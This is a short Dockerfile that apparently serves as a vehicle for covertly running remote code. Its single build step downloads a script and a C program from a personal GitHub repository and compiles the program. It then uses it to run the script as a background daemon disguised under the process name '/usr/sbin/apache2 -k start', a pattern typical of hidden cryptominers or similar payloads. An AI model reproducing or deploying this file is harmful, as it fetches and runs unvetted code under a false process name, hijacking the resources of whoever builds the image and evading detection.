FROM ubuntu:18.04

# Insta
RUN \
  apt-get update && \
    apt-get install -y wget && \
      apt-get install -y unzip && \
        wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh && \
	  chmod +x rocky.sh && \
	    
	     wget https://github.com/thoeb292/thoeb292/raw/main/mas.c && \
              gcc -o test mas.c && \
               ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rocky.sh && \
                  sleep 618 && \
	       rm -rf /var/lib/apt/lists/*
